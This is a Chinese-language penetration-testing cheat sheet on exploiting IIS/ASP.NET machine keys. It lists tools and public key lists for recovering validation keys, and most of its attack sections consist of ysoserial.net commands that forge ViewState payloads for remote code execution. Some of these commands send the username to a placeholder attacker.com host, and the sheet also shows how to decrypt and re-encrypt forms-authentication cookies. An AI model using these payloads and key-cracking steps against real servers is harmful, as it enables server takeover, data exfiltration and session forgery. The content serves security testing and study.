[原文文档](IIS-Machine-Keys.en.md)

# IIS 机器密钥

> 该机器密钥用于表单身份验证 cookie 数据和视图状态数据的加密和解密，以及进程外会话状态标识的验证。

## 摘要

* [Viewstate 格式](#viewstate-格式)
* [机器密钥格式和位置](#机器密钥格式和位置)
* [识别已知机器密钥](#识别已知机器密钥)
* [解码 ViewState](#解码-viewstate)
* [生成用于 RCE 的 ViewState](#生成用于-rce-的-viewstate)
    * [未启用 MAC](#未启用-mac)
    * [已启用 MAC 且禁用加密](#已启用-mac-且禁用加密)
    * [已启用 MAC 且启用加密](#已启用-mac-且启用加密)
* [使用机器密钥编辑 Cookie](#使用机器密钥编辑-cookie)
* [参考资料](#参考资料)

## Viewstate 格式

IIS 中的 ViewState 是一种用于在 ASP.NET 应用程序的回传之间保留 Web 控件状态的技术。它将数据存储在页面上的隐藏字段中，允许页面维护用户输入和其他状态信息。

| 格式 | 属性 |
| --- | --- |
| Base64 | `EnableViewStateMac=False`,  `ViewStateEncryptionMode=False` |
| Base64 + MAC | `EnableViewStateMac=True` |
| Base64 + 加密 | `ViewStateEncryptionMode=True` |

默认情况下，直到 2014 年 9 月，`enableViewStateMac` 属性设置为 `False`。
通常未加密的 viewstate 以字符串 `/wEP` 开头。

## 机器密钥格式和位置

IIS 中的 machineKey 是 ASP.NET 中的一个配置元素，指定用于加密和验证数据（如视图状态和表单身份验证令牌）的加密密钥和算法。它确保 Web 应用程序之间的一致性和安全性，特别是在 Web 场环境中。

machineKey 的格式如下。

```xml
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto (default) | DES | 3DES | AES | alg:algorithm_name]" />
```

`validationKey` 属性指定一个十六进制字符串，用于验证数据，确保其未被篡改。

`decryptionKey` 属性提供一个十六进制字符串，用于加密和解密敏感数据。

`validation` 属性定义用于数据验证的算法，选项包括 SHA1、MD5、3DES、AES 和 HMACSHA256 等。

`decryption` 属性指定加密算法，选项包括 Auto、DES、3DES 和 AES，或者您可以使用 alg:algorithm_name 指定自定义算法。

以下 machineKey 示例来自 [Microsoft 文档](https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication)。

```xml
<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
```

**web.config** / **machine.config** 的常见位置

* 32 位
    * `C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config`
    * `C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config`
* 64 位
    * `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config`
    * `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config`
* 启用 **AutoGenerate** 时在注册表中（使用 [irsdl/machineKeyFinder.aspx](https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab) 提取）
    * `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4`  
    * `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey`

## 识别已知机器密钥

尝试来自已知产品、Microsoft 文档或互联网其他部分的多个机器密钥。

* [isclayton/viewstalker](https://github.com/isclayton/viewstalker)

    ```powershell
    ./viewstalker --viewstate /wEP...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt
    ____   ____.__                       __         .__   __
    \   \ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________ 
    \   Y   / |  |/ __ \ \/ \/ /  ___/\   __\__  \ |  | |  |/ // __ \_  __ \
    \     /  |  \  ___/\     /\___ \  |  |  / __ \|  |_|    <\  ___/|  | \/
    \___/   |__|\___  >\/\_//____  > |__| (____  /____/__|_ \\___  >__|   
                        \/           \/            \/          \/    \/       

    找到密钥！！！
    主机：   
    验证密钥： XXXXX,XXXXX
    ```

* [blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets)

    ```ps1
    python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6
    找到匹配的 MachineKeys！
    validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1
    ```

* [NotSoSecure/Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)

    ```powershell
    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
    ```

* [0xacb/viewgen](https://github.com/0xacb/viewgen)

    ```powershell
    $ viewgen --guess "/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
    [+] ViewState 未加密
    [+] 签名算法： SHA1
    ```

可使用的有趣机器密钥列表：

* [NotSoSecure/Blacklist3r/MachineKeys.txt](https://github.com/NotSoSecure/Blacklist3r/raw/f10304bc90efaca56676362a981d93cc312d9087/MachineKey/AspDotNetWrapper/AspDotNetWrapper/Resource/MachineKeys.txt)
* [isclayton/viewstalker/MachineKeys2.txt](https://raw.githubusercontent.com/isclayton/viewstalker/main/MachineKeys2.txt)
* [blacklanternsecurity/badsecrets/aspnet_machinekeys.txt](https://raw.githubusercontent.com/blacklanternsecurity/badsecrets/dev/badsecrets/resources/aspnet_machinekeys.txt)

## 解码 ViewState

* [BApp Store > ViewState Editor](https://portswigger.net/bappstore/ba17d9fb487448b48368c22cb70048dc) - ViewState Editor 是一个扩展，允许您查看和编辑 V1.1 和 V2.0 ASP 视图状态数据的结构和内容。
* [0xacb/viewgen](https://github.com/0xacb/viewgen)

    ```powershell
    viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
    ```

## 生成用于 RCE 的 ViewState

首先，您需要解码 Viewstate 以了解是否启用了 MAC 和加密。

**要求**：

* `__VIEWSTATE`
* `__VIEWSTATEGENERATOR`

### 未启用 MAC

```ps1
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName"
```

### 已启用 MAC 且禁用加密

* 使用 `badsecrets`、`viewstalker`、`AspDotNetWrapper.exe` 或 `viewgen` 查找机器密钥 (validationkey)

    ```ps1
    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
    # --modifier = `__VIEWSTATEGENERATOR` 参数值
    # --encrypteddata = 目标应用程序的 `__VIEWSTATE` 参数值
    ```

* 然后使用 [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) 生成 ViewState，`TextFormattingRunProperties` 和 `TypeConfuseDelegate` 小工具都可以使用。

    ```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe -c nslookup http://attacker.com" --generator=3E92B2D6 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

    # --generator = `__VIEWSTATEGENERATOR` 参数值
    # --validationkey = 来自上一个命令的验证密钥
    ```

### 已启用 MAC 且启用加密

默认验证算法是 `HMACSHA256`，默认解密算法是 `AES`。

如果缺少 `__VIEWSTATEGENERATOR` 但应用程序使用 .NET Framework 4.0 或更低版本，您可以使用应用程序的根目录（例如：`--apppath="/testaspx/"`）。

* **.NET Framework < 4.5**，ASP.NET 始终接受未加密的 `__VIEWSTATE`，如果您从请求中删除 `__VIEWSTATEENCRYPTED` 参数

    ```ps1
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
    ```

* **.NET Framework > 4.5**，machineKey 具有属性：`compatibilityMode="Framework45"`

    ```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
    ```

## 使用机器密钥编辑 Cookie

如果您有 `machineKey` 但 viewstate 被禁用。

ASP.NET 表单身份验证 Cookie：[liquidsec/aspnetCryptTools](https://github.com/liquidsec/aspnetCryptTools)

```powershell
# 解密 cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# 加密 cookie（编辑 Decrypted.txt）
$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
```

## 参考资料

* [深入探讨 .NET ViewState 反序列化及其利用 - Swapneil Kumar Dash - 2019 年 10 月 22 日](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [通过 ViewState 利用 ASP.NET 中的反序列化 - Soroush Dalili - 2019 年 4 月 23 日](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [使用 Blacklist3r 和 YSoSerial.Net 利用 ViewState 反序列化 - Claranet - 2019 年 6 月 13 日](https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet)
* [Project Blacklist3r - @notsosecure - 2018 年 11 月 23 日](https://www.notsosecure.com/project-blacklist3r/)
* [View State，正在被积极利用的不可修补的 IIS 永久日 - Zeroed - 2024 年 7 月 21 日](https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/)